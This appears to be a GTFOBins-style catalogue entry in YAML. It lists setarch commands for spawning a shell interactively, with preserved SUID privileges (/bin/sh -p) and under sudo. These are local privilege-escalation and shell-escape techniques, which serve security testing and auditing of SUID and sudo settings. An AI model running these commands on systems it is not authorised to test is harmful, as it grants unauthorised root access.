---
functions:
  execute-interactive:
    - code: setarch $(arch) /bin/sh
  suid-enabled:
    - code: ./setarch $(arch) /bin/sh -p
  sudo-enabled:
    - code: sudo setarch $(arch) /bin/sh
---
